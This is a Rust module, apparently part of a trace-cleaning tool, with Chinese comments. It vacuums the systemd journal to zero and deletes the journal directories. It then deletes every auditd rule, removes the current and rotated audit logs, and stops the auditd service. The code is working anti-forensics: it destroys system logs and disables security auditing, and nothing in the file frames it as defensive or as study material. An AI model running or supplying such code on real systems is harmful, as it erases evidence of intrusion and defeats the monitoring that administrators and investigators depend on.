use crate::common::Context;
use std::path::Path;

pub fn clean_systemd_journal(ctx: &Context) {
    ctx.info("清理 systemd journal...");

    // 先 rotate 再 vacuum
    ctx.run_cmd("journal rotate", "journalctl", &["--rotate"]);
    ctx.run_cmd("journal vacuum", "journalctl", &["--vacuum-size=0"]);

    // 直接清理 journal 目录
    let journal_dirs = ["/var/log/journal", "/run/log/journal"];
    for dir in &journal_dirs {
        let p = Path::new(dir);
        if p.exists() {
            ctx.remove(p);
        }
    }

    // 重启 journald 使其重新创建目录
    ctx.run_cmd("重启 journald", "systemctl", &["restart", "systemd-journald"]);
}

pub fn clean_auditd(ctx: &Context) {
    ctx.info("清理 auditd...");

    // 清空审计规则
    ctx.run_cmd("清空 audit 规则", "auditctl", &["-D"]);

    // 清理审计日志
    let audit_logs = [
        "/var/log/audit/audit.log",
        "/var/log/audit/audit.log.1",
        "/var/log/audit/audit.log.2",
        "/var/log/audit/audit.log.3",
        "/var/log/audit/audit.log.4",
    ];
    for log in &audit_logs {
        let p = Path::new(log);
        if p.exists() {
            ctx.remove(p);
        }
    }

    // 停止 auditd
    ctx.run_cmd("停止 auditd", "service", &["auditd", "stop"]);
}
